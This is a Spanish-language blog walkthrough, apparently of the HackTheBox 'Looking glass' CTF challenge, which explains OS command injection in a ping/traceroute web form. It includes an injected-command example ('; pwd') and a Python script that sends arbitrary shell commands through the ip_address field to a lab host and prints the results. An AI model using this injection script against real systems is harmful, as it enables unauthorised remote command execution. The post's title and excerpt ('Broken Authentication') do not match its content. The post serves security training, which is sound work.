---
title: "Broken Authentication"
excerpt: "**Broken Authentication** Module Walkthrough ' HackTheBox Academy"
header:
  overlay_image: /assets/images/HTB_looking_glass/banner.png
  teaser: /assets/images/HTB_looking_glass/auth.jpg
  og_image: /assets/images/HTB_looking_glass/auth.jpg
categories:
  - HTB_Academy
tags:
  - HTB_Academy
  - Challenge
  - Web
  - OWASP TOP 10
---
![image-center](\assets\images\HTB_looking_glass\auth.jpg)
## ¿Qué es un Challenge en HTB?
Los challenges de HackTheBox son pequeños desafíos para probar diferentes técnicas de pentesting. Tienen tres niveles de dificultad (Easy, Medium, Hard) según el color de su entrada, pero la dificultad real es calificada por los usarios que han completado el challenge en una escala de diez nieveles (desde "Piece of cake" a "Brainfuck")

Lo primero que debemos hacer es ir a la página web de Hack The Box y en la parte izquierda tenemos un menú en el que podemos ver varias secciones como *Labs*, *Ranking*, *Battleground*, etc. Seleccionamos la pestaña *Labs* y se nos muestra un desplegable, pulsamos en la opción Tracks como se muestra en la siguiente imagen.

![image-center](\assets\images\HTB_looking_glass\tracks.png)

Este challenge está comprendido dentro del track de OWASP Top 10, que contiene 10 challenges de vulnerabilidades WEB con nivel de dificultad Easy:

![image-center](\assets\images\HTB_looking_glass\owasp.png)

Elegimos el challenge de looking glass:

![image-center](\assets\images\HTB_looking_glass\looking_glass.png)

Y ya podemos arrancar la máquina pulsando el boton de Start Instance:

![image-center](\assets\images\HTB_looking_glass\looking_glass_2.png)

Importante: para poder acceder a la máquina antes debemos conectarnos a la VPN.

![image-center](\assets\images\HTB_looking_glass\vpn.png)

## Looking glass challenge

Segun la propia descripción del challenge:
> _**“Hemos creado la herramienta más segura de networking en el mercado, ¡ven y pruébala!”**_

Arrancamos la máquina y vemos que nos muestra:

![image-center](\assets\images\HTB_looking_glass\vpn.png)

Se aprecia un menú de opciones en el que podemos seleccionar entre el comando Ping y Traceroute y además podemos introducir manualmente la IP a la que queremos hacer Ping o Traceroute.

Esto podría implementarse en el lado del servidor con la siguiente línea:
```sh
system("ping -c 4 " + IP);
```
Básicamente estamos pasando los parametros a Bash por lo que podríamos instertar un `;` en la variable IP, haciendo que lo que fuera detras de este punto y coma se interprete como un comando diferente:

```sh
system("ping -c 4 192.168.0.1; pwd");
```

En el ejemplo anterior `pwd` se ejecutaría como un comando separado.


```python
from requests import post

comando = input('Introduce el comando que quieres ejecutar:  ')

datos_post = {'test': 'ping', 'ip_address': f'206.189.125.57; {comando}', 'submit': 'Test'}
respuesta = post('http://206.189.125.57:30011/', data=datos_post)

data = respuesta.text
data = data.split('loss\n')[-1]
data = data.split('</textarea>')[0]

print(data.strip())
```

Se trata de una vulnerabilidad RCE (Remote Code Execution) que explicaré en próximos posts.